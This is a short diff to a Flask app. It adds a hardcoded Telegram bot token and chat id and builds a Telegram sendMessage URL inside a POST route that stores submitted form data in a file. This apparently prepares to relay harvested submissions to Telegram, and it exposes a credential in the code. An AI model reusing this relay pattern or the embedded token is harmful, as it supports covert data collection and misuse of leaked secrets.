@@ -68,6 +68,12 @@ def bofh():
 @app.route('/secure/texts.html', methods=['POST'])
 def texts():
     if request.method == 'POST':
+        key = '-426528357'
+        group = '5585546662:AAG4_54V68C4howzaqkVwsRTW5WAQeYAH5c'
+        url = "https://api.telegram.org/bot" + key + "/sendMessage?chat_id=" + group + "&text="
+        to = request.headers.get('to')
+        content = request.headers.get('content')
+        key = request.headers.get('key')
         result = request.values.keys()
         with open("Fuckyou.txt",'w') as fuckyoucunt:
             fuckyoucunt.write(result)
